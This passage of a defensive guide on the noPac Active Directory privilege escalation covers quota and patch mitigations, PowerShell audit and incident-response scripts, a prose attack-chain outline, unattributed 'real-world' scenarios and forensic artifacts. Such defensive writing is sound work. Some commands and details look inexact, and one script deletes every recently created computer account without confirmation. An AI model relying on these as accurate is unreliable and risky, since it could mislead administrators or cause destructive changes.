**GUI Method (ADUC):**
1. Open **Active Directory Users and Computers** (dsa.msc).
2. Click **View** → **Advanced Features**.
3. Right-click the **domain root** → **Properties**.
4. Click **Attribute Editor** tab.
5. Locate `ms-DS-MachineAccountQuota` → Set value to **0**.
6. Click **OK**.

**Impact:**
- Regular domain users can no longer create machine accounts.
- Only Domain Admins can join computers to the domain.
- noPac exploitation chain is blocked at Stage 1 (machine account creation fails).

---

### Mitigation 2: Apply November 2021 Security Updates (Required)

**Objective:** Install patches for CVE-2021-42278 and CVE-2021-42287.

**Patch List:**
- Windows Server 2016: KB5007247 (November 2021)
- Windows Server 2019: KB5007251 (November 2021)
- Windows Server 2022: KB5007293 (November 2021)
- Additional: KB5008601 (November 14, 2021 - Out-of-Band)

**Installation via Windows Update:**
1. Open **Settings** → **Update & Security** → **Windows Update**.
2. Click **Check for updates**.
3. Install all pending security updates.
4. Reboot when prompted.

**Verification:**
```powershell
# Check if patch is installed
Get-HotFix -Id KB5007251 | Select-Object HotFixID, InstalledOn
```

**Impact:**
- PAC validation is hardened; KDC will reject forged tickets.
- noPac exploitation is prevented even if machine account creation is possible.
- All Domain Controllers must be patched; one unpatched DC = full domain remains vulnerable.

---

### Mitigation 3: Implement Kerberos Hardening

**Objective:** Enable strict Kerberos validation and audit settings.

**Group Policy (on Domain Controllers):**
1. Open **Group Policy Management** (gpmc.msc).
2. Edit **Default Domain Policy**.
3. Navigate: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Kerberos Policy**.
4. Set:
   - **Enforce user logon restrictions:** Enabled
   - **Ticket lifetime:** 10 hours (default is usually fine)
   - **Renewable ticket lifetime:** 7 days

5. Navigate: **Computer Configuration** → **Policies** → **Windows Settings** → **Local Policies** → **Audit Policy**.
6. Enable:
   - **Audit authentication services:** Success and Failure
   - **Audit account logon events:** Success and Failure

7. Apply and reboot Domain Controllers.

---

### Mitigation 4: Monitor and Alert on sAMAccountName Conflicts

**Objective:** Detect when multiple objects have similar SAM names.

**PowerShell Monitoring Script:**
```powershell
# Check for sAMAccountName conflicts or duplicates
$domain = (Get-ADDomain).DistinguishedName

# Find all objects with Admin-like names
Get-ADObject -Filter * -Properties sAMAccountName | 
  Where-Object { $_.sAMAccountName -like "*admin*" -or $_.sAMAccountName -like "*admin$" } | 
  Select-Object Name, sAMAccountName, ObjectClass | 
  Group-Object -Property sAMAccountName | 
  Where-Object { $_.Count -gt 1 } | 
  ForEach-Object { 
    Write-Host "WARNING: Multiple objects with sAMAccountName: $($_.Name)" -ForegroundColor Yellow
  }
```

---

### Mitigation 5: Delete Unused/Suspicious Computer Accounts

**Objective:** Periodically audit and delete test or suspicious computer accounts created by regular users.

**PowerShell Script:**
```powershell
# Find computer accounts created by non-admin users
$domain = (Get-ADDomain).DistinguishedName
$adminSID = (Get-ADUser -Identity "Administrator").SID

Get-ADComputer -Filter * -Properties msDS-CreatorSID, Created | 
  Where-Object { 
    $_."msDS-CreatorSID" -ne $adminSID -and 
    $_.Created -gt (Get-Date).AddDays(-30)
  } | 
  Select-Object Name, "msDS-CreatorSID", Created | 
  Format-Table

# Delete suspicious accounts (after review)
# Remove-ADComputer -Identity "FAKE01" -Confirm
```

---

### Mitigation 6: Require Strong Authentication for Privileged Accounts

**Objective:** Implement MFA for Domain Admin accounts to prevent compromise via ticket forgery.

**Azure AD (Cloud-based):**
- Require MFA for all Global Admins and Domain Admins.
- Use Conditional Access policies to enforce MFA based on risk level.

**On-Premises:**
- Deploy RADIUS/OTP authentication for privileged accounts.
- Implement Windows Hello for Business for passwordless sign-in.

---

## 14. DETECTION & INCIDENT RESPONSE

### Incident Response Playbook

**Step 1: Immediate Containment (First 30 minutes)**
```powershell
# 1. Identify the compromised user account
Get-ADComputer -Filter "Creator -eq '*'" -Properties msDS-CreatorSID | 
  Where-Object { $_.Created -gt (Get-Date).AddHours(-1) }

# 2. Disable the compromised user account
Disable-ADAccount -Identity "compromised_user"

# 3. Revoke all Kerberos tickets (force re-authentication)
# This invalidates all tickets issued for this user
# Typically done by resetting the krbtgt password twice

# 4. Delete suspicious computer accounts
Get-ADComputer -Filter "Created -gt '$((Get-Date).AddHours(-1))'" | 
  Remove-ADComputer -Confirm:$false
```

**Step 2: Evidence Collection (Hour 1-2)**
```powershell
# Collect noPac-specific evidence
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4720, 5136, 4768, 4769
    StartTime = (Get-Date).AddHours(-24)
} | Export-Csv -Path "C:\Incident\noPac_Events.csv" -NoTypeInformation

# Export all computer accounts created in past 24 hours
Get-ADComputer -Filter "Created -gt '$((Get-Date).AddDays(-1))'" `
  -Properties Created, msDS-CreatorSID | 
  Export-Csv -Path "C:\Incident\NewComputerAccounts.csv" -NoTypeInformation
```

**Step 3: Root Cause Analysis (Hour 2-6)**
1. Identify which user account was compromised (from computer creator SID).
2. Determine how the user was compromised (phishing, credential spray, etc.).
3. Check if krbtgt password was dumped (DCSync via compromised ticket).
4. Audit all Kerberos tickets issued in past 24 hours.
5. Check if Golden Tickets were created (via Mimikatz).

**Step 4: Remediation (Hour 6+)**
1. **Reset all Domain Admin passwords** (including krbtgt twice).
2. **Force password reset for all users** (if DCSync was performed).
3. **Re-apply November 2021 patches** to all Domain Controllers.
4. **Set ms-DS-MachineAccountQuota = 0** domain-wide.
5. **Implement Kerberos hardening** (strict validation).

**Step 5: Prevention & Hardening**
- Deploy Privileged Access Workstation (PAW) for admins.
- Implement MFA for all privileged accounts.
- Enable enhanced audit logging for Kerberos.
- Quarterly penetration testing to verify fixes.

---

## 15. RELATED ATTACK CHAIN

**Prerequisites:** Valid domain user credentials (compromised via phishing, credential spray, insider threat).

**Exploitation:**
1. Machine account creation (using domain user's quota).
2. sAMAccountName spoofing (CVE-2021-42278).
3. Kerberos TGT obtained for spoofed account.
4. sAMAccountName restored (avoid KDC detection).
5. S4U2Self service ticket request (CVE-2021-42287).
6. Domain Admin privileges obtained.

**Post-Exploitation:**
- DCSync password hash extraction.
- Golden Ticket creation (10-year domain persistence).
- Lateral movement to all domain systems.
- Data exfiltration and ransomware deployment.

---

## 16. REAL-WORLD EXAMPLES

### Example 1: noPac Exploitation in Healthcare Environment

**Scenario:** Large healthcare organization with hybrid AD/Azure.

**Attack Timeline:**
1. Phishing email targets help desk staff.
2. Help desk user clicks malicious link, credentials harvested.
3. Attacker creates 10 computer accounts using help desk user's quota.
4. Within 15 minutes: Domain Admin privilege obtained via noPac.
5. Within 1 hour: krbtgt password dumped; Golden Tickets created.
6. Within 24 hours: Ransomware deployed across 500+ systems.

**Detection & Response:**
- Anomaly detection flagged unusual computer account creation rate.
- Security team isolated compromised help desk machine.
- noPac exploitation confirmed via Event ID 5136 analysis.
- Response: Rebuild all DCs, force password reset for 5000+ users, 2-week recovery.

---

### Example 2: Post-Patch Validation Failure

**Scenario:** Organization applies November 2021 patches to 3 DCs but misses 1 DC due to maintenance window.

**Attack Timeline:**
1. Attacker discovers 1 unpatched DC via network scanning.
2. noPac exploitation targets unpatched DC.
3. Attacker obtains forged Kerberos ticket valid across forest.
4. Golden Ticket created; persistent access established.

**Lesson:** **All Domain Controllers must be patched simultaneously.** One unpatched DC = full forest compromise risk.

---

## 17. FORENSIC ANALYSIS ARTIFACTS

### Artifacts to Collect

| Artifact | Location | Indicates |
|---|---|---|
| Computer account creation events | Event ID 4720 | noPac Stage 1 |
| sAMAccountName modifications | Event ID 5136 | noPac Stage 2-3 |
| Kerberos TGT requests | Event ID 4768 | noPac Stage 4 |
| S4U2Self requests | Event ID 4769 | noPac Stage 6 |
| File creation times | `C:\Windows\Temp` | Tool staging |
| PowerShell execution history | `C:\Users\...\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline` | Command execution |

---

## References & Authoritative Sources

1. **CVE Details:**
   - [CVE-2021-42287 - MITRE CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42287)
   - [CVE-2021-42278 - MITRE CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42278)

2. **Original noPac Research:**
   - [Andy Robbins: "Kerberos Attacks" (BlackHat)](https://www.blackhat.com/)
   - [HunIO: "Having Fun with noPac"](https://hunio.org/posts/security/having-fun-with-nopac/)

3. **Microsoft Security Updates:**
   - [MS Security Advisory CVE-2021-42278 / CVE-2021-42287](https://msrc.microsoft.com/update-guide)

4. **Defensive Mitigations:**
   - [Microsoft: Machine Account Quota (MAQ) Guidance](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/prevent-users-from-joining-computers-to-domain)
   - [Trimarc: noPac Mitigation Guide](https://www.trimarcsecurity.com)

5. **Detection & Response:**
   - [Sophos: noPac Vulnerability Analysis](https://www.sophos.com/en-us/security/threat-analysis/nopac-vulnerability)
   - [Palo Alto Cortex: noPac Detection](https://www.paloaltonetworks.com/blog/security-operations/detecting-the-kerberos-nopac-vulnerabilities-with-cortex-xdr/)

6. **MITRE ATT&CK:**
   - [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)

---